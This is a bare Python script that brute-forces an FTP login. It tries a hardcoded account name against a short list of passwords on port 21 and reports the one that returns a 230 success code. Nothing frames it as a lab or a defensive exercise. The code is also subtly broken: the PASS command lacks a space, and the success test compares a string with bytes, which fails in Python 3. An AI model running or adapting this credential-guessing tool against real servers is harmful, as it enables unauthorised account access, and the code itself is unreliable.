import socket
import re
import sys

def connect(username, password):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    print("[*] Trying " + username + ":" + password)
    s.connect(('0.0.0.0', 21))
    data = s.recv(1024)
    s.send(bytes('USER ' + username + '\r\n', 'ascii'))
    data = s.recv(1024)
    s.send(bytes('PASS' + password + '\r\n', 'ascii'))
    data = s.recv(3)
    s.send(bytes('QUIT\r\n', 'ascii'))
    s.close()

    return data

username = "u279984810"

passwords = ["test", "backup", "potato", "orange"]

for password in passwords:
    attempt = connect(username, password)
    print("[*] Response: " + str(attempt))

    if("230" in attempt):
        print("[*] Password found: " + password)
        sys.exit(0)